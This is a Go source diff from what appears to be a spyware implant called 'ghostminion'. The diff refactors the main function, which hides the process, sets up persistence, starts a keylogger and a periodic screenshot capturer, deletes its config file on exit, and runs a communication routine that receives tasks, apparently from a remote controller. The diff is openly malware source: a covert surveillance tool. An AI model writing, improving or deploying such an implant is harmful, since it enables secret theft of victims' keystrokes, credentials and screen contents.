@@ -10,15 +10,22 @@ import (
 	"ghostminion/persistence"
 )
 
+var (
+	configInstance = config.GetInstance()
+	_              = db.GetInstance()
+	lgr            = logger.GetLogger()
+)
+
 func main() {
-	configInstance := config.GetInstance()
 
-	db.GetInstance()
+	defer func() {
+		err := config.DeleteConfig()
+		if err != nil {
+			lgr.Error("couldn't delete config file", err)
+		}
+	}()
 
-	lgr := logger.GetLogger()
-	defer func(log *logger.Logger) {
-		_ = log.Close() //TODO: do not ignore this error
-	}(lgr)
+	defer lgr.Close()
 
 	hider.Hide()
 
@@ -33,17 +40,7 @@ func main() {
 	lgr.Debug("targetId: %s", targetId)
 
 	appManager := apps.GetAppManagerInstance()
-	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
-
-	appManager.StartApp(string(apps.ScreenShotTask)+"_default", apps.NewScreenshotApp(
-		configInstance.Apps.Screenshot["Interval"].(int),
-		configInstance.Apps.Screenshot["Quality"].(int),
-	))
-	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
-		FilesExistence: []string{
-			configInstance.Installation.DBPath,
-		},
-	})
+	addApps(appManager)
 
 	taskCh := make(chan apps.AppData)
 	go communication.Routine(taskCh)
@@ -58,4 +55,24 @@ func main() {
 	}
 
 	appManager.StopAll()
+}
+
+func addApps(appManager *apps.AppManager) {
+	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
+
+	app, err := apps.NewScreenshotApp(
+		configInstance.Apps.Screenshot["Interval"].(int),
+		configInstance.Apps.Screenshot["Quality"].(int),
+	)
+	if app != nil {
+		appManager.StartApp(string(apps.ScreenShotTask)+"_default", app)
+	} else if err != nil {
+		lgr.Error("Error creating screenshot app err: %s", err.Error())
+	}
+
+	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
+		FilesExistence: []string{
+			configInstance.Installation.DBPath,
+		},
+	})
 }
